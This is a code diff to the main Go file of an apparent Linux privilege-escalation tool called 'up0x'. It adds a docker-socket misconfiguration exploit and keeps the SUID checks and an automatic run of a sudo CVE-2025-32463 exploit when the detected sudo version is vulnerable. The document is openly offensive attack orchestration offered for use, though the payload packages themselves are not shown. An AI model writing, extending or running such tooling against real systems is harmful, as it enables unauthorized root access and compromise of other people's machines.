@@ -5,6 +5,7 @@ import (
 	"os/exec"
 	"regexp"
 	"up0x/payload/exploits/misconfig/SUID"
+	"up0x/payload/exploits/misconfig/docker-sock"
 	"up0x/payload/exploits/third_parts/sudo/CVE-2025-32463"
 	versionutil "up0x/util"
 )
@@ -34,9 +35,10 @@ func main() {
 	  author: g0ubu1i
 `
 	fmt.Print(blue + art + reset)
+	var exploit ExploitInterface
 	fmt.Println("[+] up0x start work")
 	fmt.Println("[+] check SUID ...")
-	exploit := &SUID.Exploit{}
+	exploit = &SUID.Exploit{}
 	exploit.Run()
 	fmt.Println("[+] check Sudo version")
 	cmd := exec.Command("sudo", "--version")
@@ -52,10 +54,13 @@ func main() {
 			fmt.Println("[+] Sudo version:", sudoVersion)
 		}
 	}
-	sudo_vulns := []Vuln{
+	exploit = nil
+	exploit = &docker_sock.Exploit{}
+	exploit.Run()
+	sudoVulns := []Vuln{
 		{"CVE-2025-32463", "1.9.14", "1.9.17", &CVE_2025_32463.Exploit{}},
 	}
-	for _, v := range sudo_vulns {
+	for _, v := range sudoVulns {
 		if versionutil.VersionInRange(sudoVersion, v.MinVer, v.MaxVer) {
 			fmt.Println("[+]", v.Name, "vulnerability found")
 			v.ExploitFunc.Run()
